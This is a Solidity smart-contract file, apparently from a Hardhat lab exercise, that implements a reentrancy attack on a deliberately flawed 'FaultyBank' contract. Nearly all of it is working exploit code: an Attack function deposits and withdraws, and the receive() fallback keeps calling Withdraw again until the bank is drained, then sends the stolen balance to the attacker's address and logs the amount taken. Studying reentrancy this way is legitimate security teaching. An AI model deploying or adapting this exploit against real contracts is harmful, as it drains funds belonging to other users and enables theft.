// SPDX-License-Identifier: MIT
/*
   We implement a malicious constract to enact the reentering attack.
*/

pragma solidity ^0.8.19;

import "hardhat/console.sol"; // We want to print messages on the console.

// need an interface in order to interact with the smart contract FaultyBank.sol
interface IFaultyBank {
    function Deposit() external payable;
    function Withdraw() external payable;
}

contract ReentrancyAttack {

    // Addresses
    IFaultyBank public immutable FaultyBank;
    address private owner;

    // contructor function called at the creation of the contract
    // we initialize the FaultyBank and the owner
    constructor (address init_FaultyBank) {
        FaultyBank = IFaultyBank(init_FaultyBank);
        owner = msg.sender;
    }

    // we fix a control such that only the owner of the contract can call the functions
    // we introduce a modifier

    modifier Ownership() {
        require(owner == msg.sender, "Only the owner can interact with this contract.");
        _;
    }

    // attack function
     function Attack() external payable Ownership {
        console.log("Attempting to deposit...");
        FaultyBank.Deposit{value : msg.value}();
        console.log("Deposit successful, attempting to withdraw...");
        FaultyBank.Withdraw();
        console.log("Withdraw function called.");
    }

    receive() external payable {
        console.log("msg.value ", msg.value);
        if (address(FaultyBank).balance >= msg.value){
            console.log("Reentering...");
            FaultyBank.Withdraw();
        }
        else {
            console.log("Victim account drained.");
            uint256 init_amount = owner.balance;
            payable(owner).transfer(address(this).balance);
            uint256 stolen_amount = owner.balance - init_amount - msg.value;
            console.log("Balance stolen ", stolen_amount);
        }
    }

    // function for returning the balance of the attacker
    function Balance() external view returns (uint256) {
        return owner.balance;
    }

}